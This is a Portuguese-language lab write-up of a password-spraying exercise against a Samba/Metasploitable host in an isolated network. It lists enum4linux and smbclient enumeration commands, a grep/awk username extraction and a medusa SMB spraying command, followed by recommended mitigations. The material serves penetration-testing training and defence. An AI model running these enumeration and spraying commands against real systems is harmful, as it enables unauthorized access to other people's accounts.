# Cenário: Password Spraying em SMB

## Objetivo
Executar password spraying em SMB com enumeração prévia de usuários para demonstrar risco de credenciais reutilizadas e falta de proteção contra autenticações em massa.

## Ambiente
- **Alvo:** `192.168.56.102` (Samba / Metasploitable)  
- **Atacante:** `192.168.56.101` (Kali Linux)  
- **Rede:** Host-Only (isolada)  
- **Ferramentas:** `enum4linux`, `smbclient`, `crackmapexec`, `medusa`  
- **Wordlists:** `wordlists/users.txt` (lista de usuários), `wordlists/spray-passwords.txt` (senhas comuns)

## Metodologia
1. **Enumeração** — identificar usuários e serviços SMB acessíveis.  
2. **Construção de lista de usuários** — filtrar usuários válidos a partir da enumeração.  
3. **Password spraying** — testar poucas senhas comuns contra muitos usuários (evitar lockout por usuário).  
4. **Validação** — confirmar acessos e listar shares acessíveis.  
5. **Documentação** — salvar outputs e sanitizar evidências.

## Comandos

### 1) Enumeração de usuários e shares
```bash
# enumeração básica
enum4linux -a 192.168.56.102 > scans/enum4linux-192.168.56.102.txt

# listar shares/versões
smbclient -L 192.168.56.102 -N
```

### 2) Filtrar/compilar lista de usuários (ex.: a partir do enum4linux)
```bash
# exemplo: extrair linhas com 'User:'
grep "User:" scans/enum4linux-192.168.56.102.txt | awk '{print $2}' > wordlists/users.txt
```

### 3) Password spraying (medusa example)
```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/spray-passwords.txt -M smb -T 6 -f -v
```

### 4) Validar credenciais encontradas
```bash
# exemplo: conectar usando smbclient
smbclient -L //192.168.56.102 -U ***REDACTED***
```

## Mitigações recomendadas

1. Detecção de pattern de spray: implementar alertas para muitas falhas distribuídas entre usuários.
2. Rate limiting e bloqueio adaptativo: aplicar limites por origem e por conta, com bloqueio temporário após padrões suspeitos.
3. Política de senha forte e rotação: proibir senhas comuns, exigir complexidade e troca periódica.
4. Monitoramento centralizado de autenticações: correlacionar falhas e tentativas em múltiplos serviços para detecção precoce.
5. Autenticação multifator (MFA): exigir MFA para contas com acesso privilegiado.
6. Revisão e hardening de shares/permssões: reduzir exposição, remover permissões excessivas e desativar shares desnecessários.
7. Implementar mecanismos de detecção de credential stuffing/spraying em SIEM/WAF: regras específicas para reconhecer padrão de tentativas em massa.
8. Treinamento e governança: conscientizar times sobre risco de reutilização de senhas e manter inventário de contas e permissões.

